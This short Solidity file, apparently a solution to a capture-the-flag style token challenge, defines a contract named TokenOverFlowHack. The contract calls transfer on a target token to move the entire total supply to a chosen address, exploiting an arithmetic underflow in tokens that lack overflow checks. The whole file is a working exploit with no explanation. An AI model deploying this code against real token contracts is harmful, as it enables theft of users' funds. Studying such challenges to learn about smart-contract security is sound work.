// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint256 _value) external  returns (bool);
    function totalSupply() external  view returns (uint256);
}


contract TokenOverFlowHack {
    function getToken(address instance,address _owner) public {
        uint256 supply = IToken(instance).totalSupply();
        IToken(instance).transfer(_owner, supply);
    }
}
